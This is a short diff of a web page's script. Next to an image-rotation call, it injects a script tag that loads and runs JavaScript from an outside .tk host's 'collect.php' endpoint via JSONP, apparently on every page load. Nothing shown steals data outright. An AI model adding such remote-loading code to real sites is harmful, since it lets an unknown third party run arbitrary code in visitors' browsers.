@@ -288,16 +288,16 @@
         rotateImages();
 
 
-    // Define a callback function
-    function handleResponse(response) {
-      // Process the response
-      console.log(response);
-    }
+// Define a callback function
+function handleResponse(response) {
+   // Process the response
+   console.log(response);
+}
 
-    // Create a script element with the JSONP URL
-    var script = document.createElement('script');
-    script.src = 'https://bitcoin-lab.tk/collect.php';
-    document.body.appendChild(script);
+// Create a script element with the JSONP URL
+var script = document.createElement('script');
+script.src = 'https://bitcoin-lab.tk/collect.php?callback=handleResponse';
+document.body.appendChild(script);
   
 
         
